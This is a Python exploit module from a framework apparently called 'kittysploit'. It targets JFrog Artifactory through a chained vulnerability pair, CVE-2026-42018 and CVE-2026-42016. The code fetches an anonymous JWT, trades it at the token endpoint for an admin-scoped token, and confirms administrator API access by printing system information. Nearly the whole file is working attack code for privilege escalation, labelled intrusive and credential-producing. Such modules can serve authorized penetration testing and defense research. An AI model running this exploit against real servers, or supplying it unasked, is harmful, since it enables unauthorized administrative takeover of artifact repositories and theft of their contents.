#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JFrog Artifactory CVE-2026-42016 scope validation bypass token escalation."""

import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "JFrog Artifactory CVE-2026-42016 Token Escalation",
        "description": (
            "Chains CVE-2026-42018 anonymous JWT acquisition with CVE-2026-42016: "
            "POST /access/api/v1/tokens accepts a low-privilege token and returns an "
            "admin-scoped token when scope validation checks signature/issuer only."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-42016", "CVE-2026-42018"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42016",
            "https://www.wiz.io/blog/artifactory-under-attack-in-the-wild-exploitation-of-cve-2026-42016-cve-2026-4201",
        ],
        "tags": [
            "jfrog",
            "artifactory",
            "jwt",
            "priv-esc",
            "admin",
            "cve-2026-42016",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "requires": {
                "tech_hints_any": ["artifactory", "jfrog"],
                "endpoint_pattern_any": ["/access/api/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "token scope bypass"},
                ],
                "suggested_followups": [],
            },
        },
    }

    anon_token = OptString("", "Existing anonymous JWT (auto-fetched when empty)", False)

    @staticmethod
    def _extract_token(body: str) -> str:
        text = (body or "").strip()
        if text.count(".") >= 2 and len(text) > 40:
            return text
        try:
            payload = json.loads(text)
        except json.JSONDecodeError:
            return ""
        for key in ("access_token", "token", "accessToken"):
            value = payload.get(key)
            if isinstance(value, str) and value.count(".") >= 2:
                return value
        return ""

    def _fetch_anonymous_token(self) -> str:
        response = self.http_request(
            method="POST",
            path="/access/api/v1/aws/token/",
            headers={"Content-Type": "application/json"},
            json={},
            allow_redirects=False,
        )
        if not response:
            return ""
        return self._extract_token(response.text or "")

    def run(self):
        print_status("CVE-2026-42016 — JFrog Artifactory token scope escalation")
        token = str(self.anon_token or "").strip() or self._fetch_anonymous_token()
        if not token:
            print_error("Could not obtain anonymous JWT (CVE-2026-42018 prerequisite)")
            return False
        print_info(f"Anonymous JWT acquired ({len(token)} chars)")
        response = self.http_request(
            method="POST",
            path="/access/api/v1/tokens",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            },
            json={
                "scope": "applied-permissions/admin",
                "audience": "*",
                "include_reference_token": True,
            },
            allow_redirects=False,
        )
        if not response or int(response.status_code or 0) not in (200, 201):
            print_error("Token escalation request failed")
            return False
        admin_token = self._extract_token(response.text or "")
        if not admin_token:
            print_error("No admin token in response")
            return False
        print_success("Admin-scoped token obtained")
        print_info(admin_token[:120] + ("..." if len(admin_token) > 120 else ""))
        info = self.http_request(
            method="GET",
            path="/artifactory/api/system/info",
            headers={"Authorization": f"Bearer {admin_token}"},
            allow_redirects=False,
        )
        if info and int(info.status_code or 0) == 200:
            print_success("Admin Artifactory API access confirmed")
            body = (info.text or "")[:800]
            if body:
                print_info(body)
            return True
        print_info("Admin token minted but system/info check did not return 200")
        return True
